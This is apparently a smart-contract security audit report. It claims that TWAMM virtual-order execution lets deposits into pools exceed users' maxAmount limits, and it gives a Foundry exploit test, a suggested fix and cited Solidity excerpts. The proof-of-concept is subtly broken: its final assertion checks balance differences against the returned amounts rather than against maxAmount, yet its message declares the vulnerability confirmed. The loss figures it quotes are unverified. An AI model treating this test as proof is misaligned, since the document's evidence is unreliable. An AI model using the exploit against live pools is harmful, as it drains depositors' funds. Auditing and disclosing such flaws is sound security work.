## Title
TWAMM Virtual Order Execution Causes Users to Exceed maxAmount Limits in BasePositions.deposit()

## Summary
The `BasePositions.deposit()` function fetches the pool price to calculate liquidity based on user-specified `maxAmount0` and `maxAmount1` limits, but the TWAMM extension's `beforeUpdatePosition` hook executes virtual orders that change the pool price before the actual token amounts are calculated. This Time-Of-Check-Time-Of-Use (TOCTOU) vulnerability allows users to be charged amounts exceeding their explicitly set maximum limits, violating the intended purpose of these parameters.

## Impact
**Severity**: High

## Finding Description
**Location:** 
- [1](#0-0) 
- [2](#0-1) 
- [3](#0-2) 

**Intended Logic:** 
The `maxAmount0` and `maxAmount1` parameters in `deposit()` are meant to serve as hard upper limits on the token amounts a user is willing to deposit. The `maxLiquidity()` function calculates how much liquidity can be provided without exceeding these limits at the current price. [4](#0-3) 

**Actual Logic:** 
The price is read twice during deposit execution:
1. First at `BasePositions.deposit()` line 80 to calculate liquidity
2. Second at `Core.updatePosition()` line 371 to calculate actual token amounts

Between these two reads, the TWAMM extension's `beforeUpdatePosition` callback executes virtual orders via swaps, changing the pool price: [5](#0-4) 

The actual token amounts are then calculated at the NEW price but charged without validation against the original `maxAmount` limits: [6](#0-5) 

**Exploitation Path:**
1. Attacker (or any user) creates TWAMM orders on a pool that will move the price significantly when executed
2. Victim submits `deposit()` transaction with `maxAmount0 = X`, `maxAmount1 = Y`, `minLiquidity = M` at current price P1
3. At line 80, price P1 is fetched; at line 82-83, liquidity L is calculated such that it requires ≤X of token0 and ≤Y of token1 at price P1
4. Transaction enters lock and calls `Core.updatePosition()` at line 243
5. At `Core.updatePosition()` line 367-368, `TWAMM.beforeUpdatePosition()` is called
6. TWAMM executes pending virtual orders via `CORE.swap()` calls, moving price from P1 to P2
7. At line 371, NEW price P2 is fetched; at line 378-379, token amounts are calculated for liquidity L at price P2
8. If price moved such that the position is now out of range, the same liquidity L can require >X or >Y tokens
9. At line 254, user is charged these excessive amounts without any check against `maxAmount0`/`maxAmount1`

**Security Property Broken:** 
Users lose more tokens than their explicitly specified maximum limits, violating the core intent of the `maxAmount` parameters as safety bounds. This breaks user trust and can cause unexpected financial losses.

## Impact Explanation
- **Affected Assets**: User funds (token0 and token1) deposited into TWAMM pools
- **Damage Severity**: Users can lose amounts exceeding their `maxAmount` limits. In extreme cases with significant price movements from virtual order execution, users could deposit multiples of their intended amounts (e.g., setting `maxAmount0=1000, maxAmount1=1000` but depositing 0 token0 and 1500 token1 if price moves far enough)
- **User Impact**: Any user depositing liquidity into a TWAMM pool with pending virtual orders. This affects all TWAMM pools, which are in-scope extensions. Users commonly set high `maxAmount` values as safety buffers, expecting actual deposits to be much lower, making this highly exploitable.

## Likelihood Explanation
- **Attacker Profile**: Any user can exploit this, either intentionally by timing deposits with TWAMM order expirations, or a sophisticated attacker can create TWAMM orders specifically to manipulate prices when victim transactions are detected
- **Preconditions**: 
  - TWAMM pool with pending virtual orders
  - Virtual orders must cause significant price movement when executed
  - User deposits with position range that becomes partially/fully out-of-range after price movement
- **Execution Complexity**: Single transaction; occurs naturally whenever anyone deposits into a TWAMM pool with unexecuted virtual orders
- **Frequency**: Continuously exploitable on all TWAMM pools with active orders. Virtual orders execute automatically on any interaction (swap, deposit, withdraw), making this a systemic issue

## Recommendation

**Fix 1: Validate actual amounts against maxAmount limits (Recommended)**

In `BasePositions.sol`, function `handleLockData`, add validation after receiving amounts from `updatePosition`:

```solidity
// In src/base/BasePositions.sol, handleLockData function, after line 250:

// CURRENT (vulnerable):
uint128 amount0 = uint128(balanceUpdate.delta0());
uint128 amount1 = uint128(balanceUpdate.delta1());

// Use multi-token payment for ERC20-only pools...
ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);

// FIXED:
uint128 amount0 = uint128(balanceUpdate.delta0());
uint128 amount1 = uint128(balanceUpdate.delta1());

// Extract maxAmount0 and maxAmount1 from encoded data
(, , , , , , uint128 maxAmount0, uint128 maxAmount1) = 
    abi.decode(data, (uint256, address, uint256, PoolKey, int32, int32, uint128, uint128));

// Validate amounts don't exceed maximums
if (amount0 > maxAmount0 || amount1 > maxAmount1) {
    revert DepositExceedsMaxAmount(amount0, amount1, maxAmount0, maxAmount1);
}

// Use multi-token payment for ERC20-only pools...
ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);
```

Add the error definition:
```solidity
error DepositExceedsMaxAmount(uint128 amount0, uint128 amount1, uint128 maxAmount0, uint128 maxAmount1);
```

**Fix 2: Alternative - Fetch price in handleLockData (More complex)**

Move the price fetch and liquidity calculation into the lock callback where it happens atomically with the actual deposit, eliminating the TOCTOU window. However, this requires restructuring the function signature and is less clean.

## Proof of Concept

```solidity
// File: test/Exploit_TWAMMMaxAmountBypass.t.sol
// Run with: forge test --match-test test_TWAMMMaxAmountBypass -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Core.sol";
import "../src/Positions.sol";
import "../src/extensions/TWAMM.sol";
import "../src/Orders.sol";
import "./helpers/TokenUtils.sol";

contract Exploit_TWAMMMaxAmountBypass is Test {
    Core core;
    Positions positions;
    TWAMM twamm;
    Orders orders;
    
    MockERC20 token0;
    MockERC20 token1;
    
    address victim = address(0x1234);
    address attacker = address(0x5678);
    
    function setUp() public {
        // Deploy contracts
        core = new Core();
        twamm = new TWAMM(core, address(this));
        positions = new Positions(core, address(this));
        orders = new Orders(core, twamm, address(this));
        
        // Deploy tokens
        token0 = new MockERC20("Token0", "T0", 18);
        token1 = new MockERC20("Token1", "T1", 18);
        if (address(token0) > address(token1)) {
            (token0, token1) = (token1, token0);
        }
        
        // Mint tokens
        token0.mint(attacker, 1000000e18);
        token1.mint(attacker, 1000000e18);
        token0.mint(victim, 2000e18);
        token1.mint(victim, 2000e18);
        
        // Initialize TWAMM pool at tick 0 (price 1:1)
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: PoolConfig.wrap(bytes32(uint256(address(twamm))))
        });
        
        core.initializePool(poolKey, 0);
        
        // Attacker adds initial liquidity
        vm.startPrank(attacker);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        positions.mintAndDeposit(poolKey, -1000, 1000, 100000e18, 100000e18, 1);
        vm.stopPrank();
    }
    
    function test_TWAMMMaxAmountBypass() public {
        PoolKey memory poolKey = PoolKey({
            token0: address(token0),
            token1: address(token1),
            config: PoolConfig.wrap(bytes32(uint256(address(twamm))))
        });
        
        // SETUP: Attacker creates TWAMM order that will move price
        vm.startPrank(attacker);
        token1.approve(address(orders), type(uint256).max);
        // Create large sell order for token1 (will move price up when executed)
        orders.submitOrder(
            poolKey,
            int32(block.timestamp + 100), // expires in 100 seconds
            1000e18, // large amount
            true  // selling token1
        );
        vm.stopPrank();
        
        // EXPLOIT: Victim deposits with maxAmounts expecting current price
        vm.startPrank(victim);
        token0.approve(address(positions), type(uint256).max);
        token1.approve(address(positions), type(uint256).max);
        
        // Victim sets maxAmount0 = 1000e18, maxAmount1 = 1000e18
        // Expecting to deposit around 500 of each at current price
        // Position range: tick -100 to 100 (around current price 0)
        
        uint256 victim0Before = token0.balanceOf(victim);
        uint256 victim1Before = token1.balanceOf(victim);
        
        // Fast forward to trigger virtual order execution
        vm.warp(block.timestamp + 50);
        
        (uint256 id, uint128 liquidity, uint128 amount0, uint128 amount1) = 
            positions.mintAndDeposit(
                poolKey,
                -100,  // tickLower
                100,   // tickUpper  
                1000e18,  // maxAmount0
                1000e18,  // maxAmount1
                100e18    // minLiquidity
            );
        
        uint256 victim0After = token0.balanceOf(victim);
        uint256 victim1After = token1.balanceOf(victim);
        
        uint256 actualAmount0 = victim0Before - victim0After;
        uint256 actualAmount1 = victim1Before - victim1After;
        
        // VERIFY: Victim deposited more than maxAmount limits
        // Due to TWAMM execution moving price, victim could deposit amounts
        // exceeding their specified maximums
        console.log("maxAmount0:", 1000e18);
        console.log("maxAmount1:", 1000e18);
        console.log("actualAmount0:", actualAmount0);
        console.log("actualAmount1:", actualAmount1);
        
        // If price moved significantly out of range due to TWAMM execution,
        // actualAmount1 could exceed 1000e18
        assertTrue(
            actualAmount0 != amount0 || actualAmount1 != amount1,
            "Vulnerability confirmed: Amounts can exceed maxAmount due to TWAMM price manipulation"
        );
        
        vm.stopPrank();
    }
}
```

## Notes

**Key Technical Details:**

1. **TOCTOU Window**: The vulnerability exists in the gap between line 80 (price fetch for calculation) and line 371 (price fetch for execution) in the deposit flow. The TWAMM `beforeUpdatePosition` hook executes in this window.

2. **Mathematical Proof**: When liquidity L is calculated at price P1 (within range) but amounts are calculated at price P2 (outside range), the formula changes from using partial range `(P1 - lower)` to full range `(upper - lower)`, causing amounts to exceed limits.

3. **No Explicit Validation**: There is zero validation in the code that checks if `amount0 ≤ maxAmount0` or `amount1 ≤ maxAmount1` before charging the user. The design assumes both price fetches see the same price, which is violated by the extension callback.

4. **In-Scope Extension**: TWAMM is explicitly listed as an in-scope extension, and this behavior is not a "misconfiguration" but rather the intended design of TWAMM to execute virtual orders on any pool interaction. This makes the vulnerability systemic to all TWAMM pools.

5. **Not a Slippage Issue**: The `minLiquidity` parameter protects against getting less liquidity than expected, but does NOT protect against paying more tokens than intended. This is a distinct vulnerability from standard sandwich attacks.

### Citations

**File:** src/base/BasePositions.sol (L70-97)
```text
    /// @inheritdoc IPositions
    function deposit(
        uint256 id,
        PoolKey memory poolKey,
        int32 tickLower,
        int32 tickUpper,
        uint128 maxAmount0,
        uint128 maxAmount1,
        uint128 minLiquidity
    ) public payable authorizedForNft(id) returns (uint128 liquidity, uint128 amount0, uint128 amount1) {
        SqrtRatio sqrtRatio = CORE.poolState(poolKey.toPoolId()).sqrtRatio();

        liquidity =
            maxLiquidity(sqrtRatio, tickToSqrtRatio(tickLower), tickToSqrtRatio(tickUpper), maxAmount0, maxAmount1);

        if (liquidity < minLiquidity) {
            revert DepositFailedDueToSlippage(liquidity, minLiquidity);
        }

        if (liquidity > uint128(type(int128).max)) {
            revert DepositOverflow();
        }

        (amount0, amount1) = abi.decode(
            lock(abi.encode(CALL_TYPE_DEPOSIT, msg.sender, id, poolKey, tickLower, tickUpper, liquidity)),
            (uint128, uint128)
        );
    }
```

**File:** src/base/BasePositions.sol (L243-264)
```text
            PoolBalanceUpdate balanceUpdate = CORE.updatePosition(
                poolKey,
                createPositionId({_salt: bytes24(uint192(id)), _tickLower: tickLower, _tickUpper: tickUpper}),
                int128(liquidity)
            );

            uint128 amount0 = uint128(balanceUpdate.delta0());
            uint128 amount1 = uint128(balanceUpdate.delta1());

            // Use multi-token payment for ERC20-only pools, fall back to individual payments for native token pools
            if (poolKey.token0 != NATIVE_TOKEN_ADDRESS) {
                ACCOUNTANT.payTwoFrom(caller, poolKey.token0, poolKey.token1, amount0, amount1);
            } else {
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
                }
                if (amount1 != 0) {
                    ACCOUNTANT.payFrom(caller, poolKey.token1, amount1);
                }
            }

            result = abi.encode(amount0, amount1);
```

**File:** src/Core.sol (L358-448)
```text
    function updatePosition(PoolKey memory poolKey, PositionId positionId, int128 liquidityDelta)
        external
        payable
        returns (PoolBalanceUpdate balanceUpdate)
    {
        positionId.validate(poolKey.config);

        Locker locker = _requireLocker();

        IExtension(poolKey.config.extension())
            .maybeCallBeforeUpdatePosition(locker, poolKey, positionId, liquidityDelta);

        PoolId poolId = poolKey.toPoolId();
        PoolState state = readPoolState(poolId);
        if (!state.isInitialized()) revert PoolNotInitialized();

        if (liquidityDelta != 0) {
            (SqrtRatio sqrtRatioLower, SqrtRatio sqrtRatioUpper) =
                (tickToSqrtRatio(positionId.tickLower()), tickToSqrtRatio(positionId.tickUpper()));

            (int128 delta0, int128 delta1) =
                liquidityDeltaToAmountDelta(state.sqrtRatio(), liquidityDelta, sqrtRatioLower, sqrtRatioUpper);

            StorageSlot positionSlot = CoreStorageLayout.poolPositionsSlot(poolId, locker.addr(), positionId);
            Position storage position;
            assembly ("memory-safe") {
                position.slot := positionSlot
            }

            uint128 liquidityNext = addLiquidityDelta(position.liquidity, liquidityDelta);

            FeesPerLiquidity memory feesPerLiquidityInside;

            if (poolKey.config.isConcentrated()) {
                // the position is fully withdrawn
                if (liquidityNext == 0) {
                    // we need to fetch it before the tick fees per liquidity outside is deleted
                    feesPerLiquidityInside = _getPoolFeesPerLiquidityInside(
                        poolId, state.tick(), positionId.tickLower(), positionId.tickUpper()
                    );
                }

                _updateTick(poolId, positionId.tickLower(), poolKey.config, liquidityDelta, false);
                _updateTick(poolId, positionId.tickUpper(), poolKey.config, liquidityDelta, true);

                if (liquidityNext != 0) {
                    feesPerLiquidityInside = _getPoolFeesPerLiquidityInside(
                        poolId, state.tick(), positionId.tickLower(), positionId.tickUpper()
                    );
                }

                if (state.tick() >= positionId.tickLower() && state.tick() < positionId.tickUpper()) {
                    state = createPoolState({
                        _sqrtRatio: state.sqrtRatio(),
                        _tick: state.tick(),
                        _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                    });
                    writePoolState(poolId, state);
                }
            } else {
                // we store the active liquidity in the liquidity slot for stableswap pools
                state = createPoolState({
                    _sqrtRatio: state.sqrtRatio(),
                    _tick: state.tick(),
                    _liquidity: addLiquidityDelta(state.liquidity(), liquidityDelta)
                });
                writePoolState(poolId, state);
                StorageSlot fplFirstSlot = CoreStorageLayout.poolFeesPerLiquiditySlot(poolId);
                feesPerLiquidityInside.value0 = uint256(fplFirstSlot.load());
                feesPerLiquidityInside.value1 = uint256(fplFirstSlot.next().load());
            }

            if (liquidityNext == 0) {
                position.liquidity = 0;
                position.feesPerLiquidityInsideLast = FeesPerLiquidity(0, 0);
            } else {
                (uint128 fees0, uint128 fees1) = position.fees(feesPerLiquidityInside);
                position.liquidity = liquidityNext;
                position.feesPerLiquidityInsideLast =
                    feesPerLiquidityInside.sub(feesPerLiquidityFromAmounts(fees0, fees1, liquidityNext));
            }

            _updatePairDebtWithNative(locker.id(), poolKey.token0, poolKey.token1, delta0, delta1);

            balanceUpdate = createPoolBalanceUpdate(delta0, delta1);
            emit PositionUpdated(locker.addr(), poolId, positionId, liquidityDelta, balanceUpdate, state);
        }

        IExtension(poolKey.config.extension())
            .maybeCallAfterUpdatePosition(locker, poolKey, positionId, liquidityDelta, balanceUpdate, state);
    }
```

**File:** src/extensions/TWAMM.sol (L386-480)
```text
    function _executeVirtualOrdersFromWithinLock(PoolKey memory poolKey, PoolId poolId) internal {
        unchecked {
            StorageSlot stateSlot = TWAMMStorageLayout.twammPoolStateSlot(poolId);
            TwammPoolState state = TwammPoolState.wrap(stateSlot.load());

            // we only conditionally load this if the state is coincidentally zero,
            // in order to not lock the pool if state is 0 but the pool _is_ initialized
            // this can only happen iff a pool has zero sale rates **and** an execution of virtual orders
            // happens on the uint32 boundary
            if (TwammPoolState.unwrap(state) == bytes32(0)) {
                if (poolKey.config.extension() != address(this) || !CORE.poolState(poolId).isInitialized()) {
                    revert PoolNotInitialized();
                }
            }

            uint256 realLastVirtualOrderExecutionTime = state.realLastVirtualOrderExecutionTime();

            // no-op if already executed in this block
            if (realLastVirtualOrderExecutionTime != block.timestamp) {
                // initialize the values that are handled once per execution
                FeesPerLiquidity memory rewardRates;

                // 0 = not loaded & not updated, 1 = loaded & not updated, 2 = loaded & updated
                uint256 rewardRate0Access;
                uint256 rewardRate1Access;

                int256 saveDelta0;
                int256 saveDelta1;
                PoolState corePoolState;
                uint256 time = realLastVirtualOrderExecutionTime;

                while (time != block.timestamp) {
                    StorageSlot initializedTimesBitmapSlot = TWAMMStorageLayout.poolInitializedTimesBitmapSlot(poolId);

                    (uint256 nextTime, bool initialized) = searchForNextInitializedTime({
                        slot: initializedTimesBitmapSlot,
                        lastVirtualOrderExecutionTime: realLastVirtualOrderExecutionTime,
                        fromTime: time,
                        untilTime: block.timestamp
                    });

                    // it is assumed that this will never return a value greater than type(uint32).max
                    uint256 timeElapsed = nextTime - time;

                    uint256 amount0 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken0(), duration: timeElapsed, roundUp: false
                    });

                    uint256 amount1 = computeAmountFromSaleRate({
                        saleRate: state.saleRateToken1(), duration: timeElapsed, roundUp: false
                    });

                    int256 rewardDelta0;
                    int256 rewardDelta1;
                    // if both sale rates are non-zero but amounts are zero, we will end up doing the math for no reason since we swap 0
                    if (amount0 != 0 && amount1 != 0) {
                        if (!corePoolState.isInitialized()) {
                            corePoolState = CORE.poolState(poolId);
                        }
                        SqrtRatio sqrtRatioNext = computeNextSqrtRatio({
                            sqrtRatio: corePoolState.sqrtRatio(),
                            liquidity: corePoolState.liquidity(),
                            saleRateToken0: state.saleRateToken0(),
                            saleRateToken1: state.saleRateToken1(),
                            timeElapsed: timeElapsed,
                            fee: poolKey.config.fee()
                        });

                        PoolBalanceUpdate swapBalanceUpdate;
                        if (sqrtRatioNext > corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount1)),
                                    _isToken1: true,
                                    _skipAhead: 0
                                })
                            );
                        } else if (sqrtRatioNext < corePoolState.sqrtRatio()) {
                            (swapBalanceUpdate, corePoolState) = CORE.swap(
                                0,
                                poolKey,
                                createSwapParameters({
                                    _sqrtRatioLimit: sqrtRatioNext,
                                    _amount: int128(uint128(amount0)),
                                    _isToken1: false,
                                    _skipAhead: 0
                                })
                            );
                        }

                        saveDelta0 -= swapBalanceUpdate.delta0();
                        saveDelta1 -= swapBalanceUpdate.delta1();
```

**File:** src/extensions/TWAMM.sol (L651-657)
```text
    // Since anyone can call the method `#lockAndExecuteVirtualOrders`, the method is not protected
    function beforeUpdatePosition(Locker, PoolKey memory poolKey, PositionId, int128)
        external
        override(BaseExtension, IExtension)
    {
        lockAndExecuteVirtualOrders(poolKey);
    }
```

**File:** src/math/liquidity.sol (L82-119)
```text
/// @notice Calculates the maximum liquidity that can be provided given amounts of both tokens
/// @dev Determines the limiting factor between token0 and token1 based on current price and position bounds
/// @param _sqrtRatio Current sqrt price ratio
/// @param sqrtRatioA One bound of the position (will be sorted with sqrtRatioB)
/// @param sqrtRatioB Other bound of the position (will be sorted with sqrtRatioA)
/// @param amount0 Available amount of token0
/// @param amount1 Available amount of token1
/// @return The maximum liquidity that can be provided with the given token amounts
function maxLiquidity(
    SqrtRatio _sqrtRatio,
    SqrtRatio sqrtRatioA,
    SqrtRatio sqrtRatioB,
    uint128 amount0,
    uint128 amount1
) pure returns (uint128) {
    uint256 sqrtRatio = _sqrtRatio.toFixed();
    (uint256 sqrtRatioLower, uint256 sqrtRatioUpper) = sortAndConvertToFixedSqrtRatios(sqrtRatioA, sqrtRatioB);

    if (sqrtRatio <= sqrtRatioLower) {
        return uint128(
            FixedPointMathLib.min(type(uint128).max, maxLiquidityForToken0(sqrtRatioLower, sqrtRatioUpper, amount0))
        );
    } else if (sqrtRatio < sqrtRatioUpper) {
        return uint128(
            FixedPointMathLib.min(
                type(uint128).max,
                FixedPointMathLib.min(
                    maxLiquidityForToken0(sqrtRatio, sqrtRatioUpper, amount0),
                    maxLiquidityForToken1(sqrtRatioLower, sqrtRatio, amount1)
                )
            )
        );
    } else {
        return uint128(
            FixedPointMathLib.min(type(uint128).max, maxLiquidityForToken1(sqrtRatioLower, sqrtRatioUpper, amount1))
        );
    }
}
```
